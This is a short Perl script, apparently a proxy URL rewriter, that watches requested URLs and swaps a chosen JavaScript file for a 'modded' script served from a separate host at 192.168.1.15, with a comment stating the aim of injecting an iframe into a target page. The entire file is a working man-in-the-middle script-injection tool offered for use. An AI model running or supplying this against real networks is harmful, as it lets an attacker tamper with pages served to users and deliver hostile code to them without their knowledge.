#!/usr/bin/perl

use strict;

# Target URI ( the page you wish to inject iframe )
my $target = 'http://cdn.replace-just-an-example.com/js/example-js-script.js';

# IP/domain of the http server hosting the modified js file 
my $js_server = "http://192.168.1.15/your-modded-script.js";

# force rapid flushing of pipes
$|=1; 

while (<>) {

	chomp($_);

	my $fullurl = $_;
	my $query = $js_server;
	my $regex = quotemeta("$target");

	if ($fullurl =~ m/$regex/ ) { print "$query\n"; } 
	  else { print "$_\n"; }


}
